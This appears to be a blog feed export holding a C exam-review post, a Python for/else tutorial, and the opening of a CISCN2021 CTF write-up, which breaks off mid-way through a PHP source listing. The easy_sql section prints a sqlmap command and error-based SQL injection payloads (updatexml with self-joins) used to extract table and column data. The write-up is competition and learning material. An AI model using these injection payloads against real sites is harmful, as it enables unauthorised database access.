class="hljs-type">char</span> *newarr=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>) * <span class="hljs-built_in">strlen</span>(str));<br>        <span class="hljs-built_in">strcpy</span>(newarr, str);<br>        prelist[i]=newarr;<br>    &#125;<br>    sort(prelist, n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s &quot;</span>, prelist[i]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-战旗游戏"><a href="#5-战旗游戏" class="headerlink" title="5. 战旗游戏"></a>5. 战旗游戏</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><blockquote><p>我知道你们男生女生都喜欢打游戏，下面这道简单的编程题是某战棋游戏的一部分，实现的功能是向上、向下、向左、 向右、向左上、向左下、向右上、向右下这八个方向移动一格。请编写一个process函数，实现对上述八个函数的调 用。 比如： </p><p>输入2 3 </p><p>则输出为：3 3</p></blockquote><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y, <span class="hljs-type">void</span> (*fun)(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y))</span><br>&#123;<br>    <span class="hljs-comment">//start</span><br>    fun(x, y);<br>    <span class="hljs-comment">//end</span><br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">up</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y)</span><br>&#123;<br>    *y = *y - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">down</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y)</span><br>&#123;<br>    *y = *y + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">left</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y)</span><br>&#123;<br>    *x = *x - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y)</span><br>&#123;<br>    *x = *x + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">up_left</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y)</span><br>&#123;<br>    *x = *x - <span class="hljs-number">1</span>;<br>    *y = *y - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">up_right</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y)</span><br>&#123;<br>    *x = *x + <span class="hljs-number">1</span>;<br>    *y = *y - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">down_left</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y)</span><br>&#123;<br>    *x = *x - <span class="hljs-number">1</span>;<br>    *y = *y + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">down_right</span><span class="hljs-params">(<span class="hljs-type">int</span> *x, <span class="hljs-type">int</span> *y)</span><br>&#123;<br>    *x = *x + <span class="hljs-number">1</span>;<br>    *y = *y + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> x,y;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;x,&amp;y)==<span class="hljs-number">2</span>)<br>    &#123;<br>        process(&amp;x,&amp;y,up);<br>        process(&amp;x,&amp;y,right);<br>        process(&amp;x,&amp;y,right);<br>        process(&amp;x,&amp;y,up_right);<br>        process(&amp;x,&amp;y,left);<br>        process(&amp;x,&amp;y,down);<br>        process(&amp;x,&amp;y,down_left);<br>        process(&amp;x,&amp;y,up_left);<br>        process(&amp;x,&amp;y,down_right);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>,x,y);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-期末成绩统计"><a href="#6-期末成绩统计" class="headerlink" title="6. 期末成绩统计"></a>6. 期末成绩统计</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><blockquote><p>期末大考周即将到来了。诸位要面临C语言、高数、大物的期末考试。请你编写一个程序，记录全班同学的三科成绩并 按C语言成绩的降序排序输出。 输入数据有多组：先用一个整型变量n存储班级同学的人数；接着存储这n名同学的三科（C语言、高数、大物）成绩 （类型为整型）；排序后输出。 比如，</p><p>输入为： 3 张三 80 70 60 李四 90 80 70 王五 100 90 80 </p><p>则输出为： 王五 100 90 80 李四 90 80 70 张三 80 70 60 </p></blockquote><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEN 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 40</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> name[LEN];<br>    <span class="hljs-type">int</span> scores[<span class="hljs-number">3</span>];<br>&#125;student[N];<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu *s,<span class="hljs-type">int</span> n)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu *s,<span class="hljs-type">int</span> n)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu *s, <span class="hljs-type">int</span> n)</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n)==<span class="hljs-number">1</span>)<br>    &#123;<br>       input(student,n);<br>       sort(student,n);<br>       print(student,n);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu *s,<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,s[i].name);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">3</span>;j++)<br>           <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;s[i].scores[j]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu *s,<span class="hljs-type">int</span> n)</span><br>&#123;<br><span class="hljs-comment">//start</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">tmp</span>;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(s[i].scores[<span class="hljs-number">0</span>]&lt;s[j].scores[<span class="hljs-number">0</span>])<br>            &#123;<br>                tmp=s[i];<br>                s[i]=s[j];<br>                s[j]=tmp;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//end</span><br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu *s, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s &quot;</span>, s[i].name);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">3</span>;j++)<br>           <span class="hljs-keyword">if</span>(j&lt;<span class="hljs-number">2</span>)<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,s[i].scores[j]);<br>           <span class="hljs-keyword">else</span><br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,s[i].scores[j]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python的For/Else语句</title>
      <link href="/2021/05/78b59d9f.html"/>
      <url>/2021/05/78b59d9f.html</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>首先我们知道可以像下面这样使用循环：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">fruits = [<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;mango&#x27;</span>]<br><span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> fruits:<br>    <span class="hljs-built_in">print</span>(fruit.capitalize())<br></code></pre></td></tr></table></figure><p>这是 for 循环的基本结构，现在让我们继续讨论 python 的 for 循环中的一个鲜为人知的特性—— else 子句。</p><p>for 循环也有一个大多数人都不熟悉 else 子句，该 else 子句在循环正常完成时执行，这意味着循环没有遇到任何 break 语句。当你明白了在哪里使用它们，就会非常有用。</p><p>常见的状况是运行一个循环并搜索一个项，如果找到该项目，我们使用 break 跳出循环。有两种情况可能会导致循环结束。第一个是找到该项并 break  ，第二种情况是循环自然结束。现在我们可能想知道其中的哪一个是循环完成的原因，一种方法是设置一个标志，然后在循环结束时检查它，另一个是使用该  else 子句。</p><p>下面是一个<code>for/else</code>循环的基本结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> container:<br>    <span class="hljs-keyword">if</span> search_something(item):<br>        <span class="hljs-comment"># Found it!</span><br>        process(item)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># Didn&#x27;t find anything..</span><br>    not_found_in_container()<br></code></pre></td></tr></table></figure><p>下面这个简单的例子来自官方文档：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, n):<br>        <span class="hljs-keyword">if</span> n % x == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(n, <span class="hljs-string">&#x27;equals&#x27;</span>, x, <span class="hljs-string">&#x27;*&#x27;</span>, n/x)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>它找出 2 到 10 之间因数。现在开始有趣的部分，我们可以添加一个额外的 else 子句块来捕捉素数并打印：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, n):<br>        <span class="hljs-keyword">if</span> n % x == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>( n, <span class="hljs-string">&#x27;equals&#x27;</span>, x, <span class="hljs-string">&#x27;*&#x27;</span>, n/x)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># loop fell through without finding a factor</span><br>        <span class="hljs-built_in">print</span>(n, <span class="hljs-string">&#x27;is a prime number&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>输出指定范围内的素数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">lower = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>upper = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lower, upper+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> num&gt;<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, num):<br>            <span class="hljs-keyword">if</span>(num%i)==<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(num)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 自学记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2021-第十四届全国大学生信息安全竞赛-WriteUp</title>
      <link href="/2021/05/6c0728af.html"/>
      <url>/2021/05/6c0728af.html</url>
      
        <content type="html"><![CDATA[<h1 id="WriteUp-Maple-root-CISCN2021"><a href="#WriteUp-Maple-root-CISCN2021" class="headerlink" title="WriteUp - Maple_root -CISCN2021"></a>WriteUp - Maple_root -CISCN2021</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总得分：3400</p><p>总排名：203</p><p>赛区排名：21</p><p>第一次认真参加正式的CTF，24+3小时的脑血栓比赛时长，收获还是很多的。</p><h2 id="开卷"><a href="#开卷" class="headerlink" title="开卷"></a>开卷</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h4><p><code>Sqlmap -r /root/wordlist/table.txt -p uname -D security --tables</code><br>Sqlmap直接跑出两张表(flag, user)<br>单跑不出列名<br>回去找到sqlmap的payload<br><code>uname=admin&#39;) RLIKE (SELECT (CASE WHEN (7431=7431) THEN 0x61646d696e ELSE 0x28 END))-- WQuk&amp;passwd=admin&amp;Submit=%E7%99%BB%E5%BD%95</code><br>修改payload<br><code>Admin’)||updatexml(1,((select * from (select * from flag as a join flag as b ) as c limit 1,1)),1)%23</code><br>爆出第一个列id<br><code>Admin’)||updatexml(1,((select * from (select * from flag as a join flag as b using(id)) as c limit 1,1)),1)%23</code><br>爆出第二个列no<br><code>Admin’)||updatexml(1,((select * from (select * from flag as a join flag as b using(id，no)) as c limit 1,1)),1)%23</code><br>爆出最后一列<code>fec74227-42d6-4636-a0d4-92f8a913vfd6</code><br>最后查询出flag</p><h4 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h4><p>扫描找到.index.php.swo，得到index.php源码。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span></span><br><span class="hljs-class"><span class="language-php"></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">c</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">g</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">j</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">k</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">l</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">m</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">n</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span 